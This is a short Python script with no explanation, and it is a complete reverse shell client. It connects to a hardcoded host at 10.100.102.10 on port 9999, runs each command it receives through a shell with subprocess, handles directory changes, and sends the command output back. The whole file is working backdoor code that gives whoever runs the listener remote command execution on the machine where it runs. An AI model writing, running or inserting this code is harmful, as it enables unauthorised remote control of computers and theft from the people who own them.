import os
import socket
import subprocess

s = socket.socket()
host = '10.100.102.10'
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    decoded_data = data.decode("utf-8")

    if decoded_data.startswith("cd "):
        try:
            os.chdir(decoded_data[3:].strip())
        except OSError:
            pass
        response = os.getcwd() + '$ '
        s.send(str.encode(response))
        print(response, end='')
        continue

    if len(data) > 0:
        process = subprocess.Popen(decoded_data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_bytes = process.stdout.read() + process.stderr.read()
        output_str = output_bytes.decode("utf-8", errors='ignore')
        response = output_str + os.getcwd() + '$ '
        s.send(str.encode(response))
        print(output_str, end='')

s.close()
